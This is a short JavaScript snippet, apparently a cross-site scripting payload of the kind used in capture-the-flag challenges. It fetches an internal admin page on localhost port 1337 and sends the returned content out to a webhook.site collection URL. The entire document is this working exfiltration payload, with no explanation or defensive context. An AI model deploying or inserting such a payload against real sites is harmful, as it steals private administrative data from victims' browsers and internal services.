fetch("http://127.0.0.1:1337/admin").then((res) => {
	return res.text();
}).then(data => {
	fetch("https://webhook.site/18c8bcc4-bed9-473d-9f49-f22ec3133adb/a.png?data="+data);
})
